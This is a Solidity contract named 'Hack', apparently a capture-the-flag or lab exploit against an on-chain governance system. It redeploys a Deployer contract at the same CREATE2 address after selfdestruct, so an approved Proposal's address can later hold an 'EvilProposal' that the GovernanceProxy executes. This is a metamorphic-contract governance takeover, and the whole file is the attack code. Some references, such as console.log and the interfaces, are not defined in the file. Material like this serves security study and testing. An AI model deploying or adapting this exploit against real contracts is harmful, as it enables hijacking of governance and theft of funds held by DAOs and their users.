// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Proposal.sol";
import "./EvilProposal.sol";
import "./GovernanceProxy.sol";
import "./Deployer.sol";
// import "./Governance.sol";

interface IHack {
    function hack() external returns (address deployerAddress);
    function hack_2() external;
}

contract Hack {
    address public governance;
    address public governanceProxy;

    constructor(address _governanceProxy, address _governance) {
        governanceProxy = _governanceProxy;
        governance = _governance;
    }

    function deployDeployer(address a) public returns (address deployerAddress) {
        // 构造 salt
        bytes32 salt = keccak256(abi.encodePacked(a));

        // 1. 获取字节码
        bytes memory bytecode = type(Deployer).creationCode;

        // 2. 用 create2 部署
        assembly {
            let codePtr := add(bytecode, 0x20)
            let codeSize := mload(bytecode)
            deployerAddress := create2(0, codePtr, codeSize, salt)
            if iszero(extcodesize(deployerAddress)) {
                revert(0, 0)
            }
        }
    }

    function hack() public {
        // 1. Create2 the Deployer contract
        address deployerAddress = deployDeployer(governance);
        console.log("Deployer contract deployed at:", deployerAddress);

        // 2. Create the Proposal contract using the Deployer
        address proposal = IDeployer(deployerAddress).deployProposal(governance);

        // 3. call the GovernanceProxy to execute the proposal
        IGovernanceProxy(governanceProxy).execute(proposal);

        // 4. call the emergencyStop function
        IProposalSelfDestruct(proposal).emergencyStop();

        // 5. selfdestruct the Deployer contract
        IDeployer(deployerAddress).emergencyStop();
    }

    function hack_2() public {
        // 6. Create2 tje Deployer contract again
        address deployerAddress = deployDeployer(governance);
        console.log("Deployer contract re-deployed at:", deployerAddress);

        // 7. Create the EvilProposal contract using the Deployer
        address evilProposal = IDeployer(deployerAddress).deployEvilProposal(governance);

        // 8. call the GovernanceProxy to execute the evil proposal
        IGovernanceProxy(governanceProxy).execute(evilProposal);
    }
}